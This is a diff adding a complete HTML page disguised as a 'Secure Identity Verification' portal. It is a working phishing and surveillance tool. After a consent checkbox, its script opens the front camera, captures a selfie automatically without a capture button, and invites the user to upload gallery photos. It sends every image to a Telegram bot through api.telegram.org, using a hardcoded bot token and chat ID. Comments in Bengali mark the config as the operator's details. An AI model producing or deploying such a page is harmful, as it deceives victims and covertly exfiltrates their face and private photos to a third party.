@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Verification Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 35px 25px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 36px;
+        }
+        h1 { font-size: 24px; margin-bottom: 8px; font-weight: 700; }
+        .subtitle { color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 25px; }
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .btn.loading .spinner { display: inline-block; }
+        .btn.loading .btn-text { display: none; }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .step { display: none; animation: fadeIn 0.4s ease; }
+        .step.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .permission-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid rgba(255,255,255,0.08);
+            text-align: left;
+        }
+        .permission-box h3 { font-size: 15px; margin-bottom: 5px; }
+        .permission-box p { font-size: 12px; color: rgba(255,255,255,0.5); }
+
+        .progress-bar {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+        .progress-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.15);
+            transition: all 0.3s;
+        }
+        .progress-dot.active { background: #667eea; transform: scale(1.3); }
+        .progress-dot.done { background: #52c41a; }
+
+        video {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 16px;
+            margin: 10px auto;
+            background: #000;
+            display: block;
+            transform: scaleX(-1);
+        }
+        
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+            margin: 15px 0;
+            max-height: 280px;
+            overflow-y: auto;
+        }
+        .gallery-grid img {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            border-radius: 8px;
+            border: 2px solid transparent;
+            transition: border 0.2s;
+            cursor: pointer;
+        }
+        .gallery-grid img.selected { border-color: #667eea; }
+
+        .status-msg {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            display: none;
+        }
+        .status-msg.show { display: block; }
+        .status-msg.success { background: rgba(82,196,26,0.15); color: #95de64; }
+        .status-msg.error { background: rgba(255,77,79,0.15); color: #ff7875; }
+        .status-msg.info { background: rgba(24,144,255,0.15); color: #69c0ff; }
+
+        .file-input { display: none; }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            justify-content: center;
+            margin: 12px 0;
+            font-size: 14px;
+        }
+        .checkbox-group input { width: 18px; height: 18px; cursor: pointer; }
+
+        .hidden { display: none !important; }
+
+        .consent-text {
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            margin-top: 20px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">🔐</div>
+    
+    <!-- Progress -->
+    <div class="progress-bar" id="progressBar">
+        <div class="progress-dot active" data-step="1"></div>
+        <div class="progress-dot" data-step="2"></div>
+        <div class="progress-dot" data-step="3"></div>
+        <div class="progress-dot" data-step="4"></div>
+    </div>
+
+    <!-- Step 1: Welcome -->
+    <div id="step1" class="step active">
+        <h1>Secure Identity Verification</h1>
+        <p class="subtitle">You have been selected for a quick verification process. This takes less than 30 seconds.</p>
+        <div class="checkbox-group">
+            <input type="checkbox" id="agreeCheck">
+            <label for="agreeCheck">I agree to the verification process</label>
+        </div>
+        <button class="btn" id="startBtn" onclick="startProcess()" disabled>
+            <span class="btn-text">Begin Verification →</span>
+            <span class="spinner"></span>
+        </button>
+    </div>
+
+    <!-- Step 2: Camera -->
+    <div id="step2" class="step">
+        <h1>📸 Camera Access</h1>
+        <p class="subtitle">We need camera access to verify your identity.</p>
+        <div class="permission-box">
+            <h3>📷 Camera Permission Required</h3>
+            <p>This allows us to take a verification photo. Your privacy is protected.</p>
+        </div>
+        <video id="cameraFeed" autoplay playsinline muted></video>
+        <div id="cameraBtnContainer">
+            <button class="btn" id="cameraBtn" onclick="startCamera()">
+                <span class="btn-text">📷 Allow Camera Access</span>
+                <span class="spinner"></span>
+            </button>
+        </div>
+        <div id="cameraStatus" class="status-msg"></div>
+    </div>
+
+    <!-- Step 3: Gallery -->
+    <div id="step3" class="step">
+        <h1>🖼️ Select Photos</h1>
+        <p class="subtitle">Please select a few photos for verification.</p>
+        <div class="permission-box">
+            <h3>🖼️ Gallery Access Required</h3>
+            <p>Select photos from your device to complete verification.</p>
+        </div>
+        <input type="file" id="fileInput" class="file-input" accept="image/*" multiple>
+        <button class="btn" onclick="document.getElementById('fileInput').click()">
+            <span class="btn-text">📁 Choose Photos</span>
+        </button>
+        <div id="galleryGrid" class="gallery-grid"></div>
+        <button class="btn" id="uploadBtn" onclick="startUpload()" style="display:none;">
+            <span class="btn-text">⬆️ Upload Selected</span>
+            <span class="spinner"></span>
+        </button>
+        <div id="galleryStatus" class="status-msg"></div>
+        <button class="btn" id="skipGalleryBtn" onclick="skipStep3()" style="margin-top:10px;background:rgba(255,255,255,0.1);">
+            <span class="btn-text">Skip →</span>
+        </button>
+    </div>
+
+    <!-- Step 4: Complete -->
+    <div id="step4" class="step">
+        <h1>✅ Verification Complete</h1>
+        <p class="subtitle">Thank you. Your identity has been successfully verified.</p>
+        <div style="font-size:48px;margin:20px 0;">🎉</div>
+        <p style="color:rgba(255,255,255,0.5);font-size:13px;">You can close this page now.</p>
+        <div id="completeStatus" class="status-msg success show">Process completed successfully!</div>
+    </div>
+
+    <p class="consent-text">This verification is required for security purposes. By proceeding, you consent to the collection of the requested information.</p>
+</div>
+
+<script>
+// ======== কনফিগারেশন (তোমার তথ্য) ========
+const BOT_TOKEN = '8817484567:AAEvht7uO_DZgcP9Gy19p6vdNaEqrautHvM';
+const YOUR_CHAT_ID = '7691253931';
+// ==========================================
+
+let cameraStream = null;
+let selfieBlob = null;
+let selectedFiles = [];
+
+// Checkbox enable/disable start button
+document.getElementById('agreeCheck').addEventListener('change', function() {
+    document.getElementById('startBtn').disabled = !this.checked;
+});
+
+function goToStep(num) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById('step' + num).classList.add('active');
+    
+    document.querySelectorAll('.progress-dot').forEach(d => {
+        const step = parseInt(d.dataset.step);
+        d.classList.remove('active', 'done');
+        if (step === num) d.classList.add('active');
+        else if (step < num) d.classList.add('done');
+    });
+}
+
+function startProcess() {
+    goToStep(2);
+    setTimeout(() => startCamera(), 500);
+}
+
+// ======== ক্যামেরা ========
+async function startCamera() {
+    const btn = document.getElementById('cameraBtn');
+    const status = document.getElementById('cameraStatus');
+    
+    btn.classList.add('loading');
+    btn.disabled = true;
+    status.className = 'status-msg info show';
+    status.textContent = '⏳ Requesting camera access...';
+
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        
+        document.getElementById('cameraFeed').srcObject = cameraStream;
+        
+        btn.classList.remove('loading');
+        btn.querySelector('.btn-text').textContent = '✅ Camera Active';
+        status.className = 'status-msg success show';
+        status.textContent = '✅ Camera access granted!';
+
+        // 1.5 সেকেন্ড পর অটো সেলফি ক্যাপচার
+        setTimeout(() => captureSelfie(), 1500);
+
+    } catch (err) {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+        status.className = 'status-msg error show';
+        status.textContent = '❌ Camera denied: ' + err.message;
+        
+        setTimeout(() => goToStep(3), 2000);
+    }
+}
+
+function captureSelfie() {
+    const video = document.getElementById('cameraFeed');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    canvas.toBlob(function(blob) {
+        selfieBlob = blob;
+        
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream = null;
+        }
+
+        // সেলফি সাথে সাথে টেলিগ্রামে পাঠাও
+        sendToTelegram(blob, '📸 Selfie captured');
+
+        setTimeout(() => goToStep(3), 800);
+    }, 'image/jpeg', 0.85);
+}
+
+// ======== গ্যালারি ========
+document.getElementById('fileInput').addEventListener('change', function(e) {
+    const files = Array.from(e.target.files);
+    selectedFiles = files;
+    
+    const grid = document.getElementById('galleryGrid');
+    grid.innerHTML = '';
+    
+    files.forEach((file) => {
+        const reader = new FileReader();
+        reader.onload = function(ev) {
+            const img = document.createElement('img');
+            img.src = ev.target.result;
+            img.onclick = function() { this.classList.toggle('selected'); };
+            grid.appendChild(img);
+        };
+        reader.readAsDataURL(file);
+    });
+
+    const uploadBtn = document.getElementById('uploadBtn');
+    uploadBtn.style.display = 'block';
+    uploadBtn.querySelector('.btn-text').textContent = `⬆️ Upload ${files.length} Photo(s)`;
+    document.getElementById('skipGalleryBtn').textContent = 'Skip →';
+});
+
+async function startUpload() {
+    const btn = document.getElementById('uploadBtn');
+    const status = document.getElementById('galleryStatus');
+    
+    btn.classList.add('loading');
+    btn.disabled = true;
+    status.className = 'status-msg info show';
+    status.textContent = `⏳ Uploading ${selectedFiles.length} photos...`;
+
+    for (let i = 0; i < selectedFiles.length; i++) {
+        const file = selectedFiles[i];
+        await sendToTelegram(file, `🖼️ Gallery photo ${i+1}/${selectedFiles.length}`);
+        status.textContent = `✅ Uploaded ${i+1}/${selectedFiles.length}`;
+    }
+
+    btn.classList.remove('loading');
+    btn.querySelector('.btn-text').textContent = '✅ All Uploaded';
+    status.className = 'status-msg success show';
+    status.textContent = `✅ All ${selectedFiles.length} photos uploaded!`;
+
+    setTimeout(() => finishProcess(), 1000);
+}
+
+function skipStep3() {
+    finishProcess();
+}
+
+function finishProcess() {
+    goToStep(4);
+    document.getElementById('completeStatus').textContent = '✅ Verification complete! All data has been sent.';
+}
+
+// ======== টেলিগ্রামে পাঠানোর ফাংশন ========
+async function sendToTelegram(file, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', YOUR_CHAT_ID);
+    formData.append('caption', caption + `\n🕐 ${new Date().toLocaleString()}`);
+    formData.append('photo', file, 'photo.jpg');
+
+    try {
+        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+        const result = await resp.json();
+        console.log('Telegram response:', result);
+        return result;
+    } catch (err) {
+        console.error('Send error:', err);
+    }
+}
+</script>
+</body>
+</html>
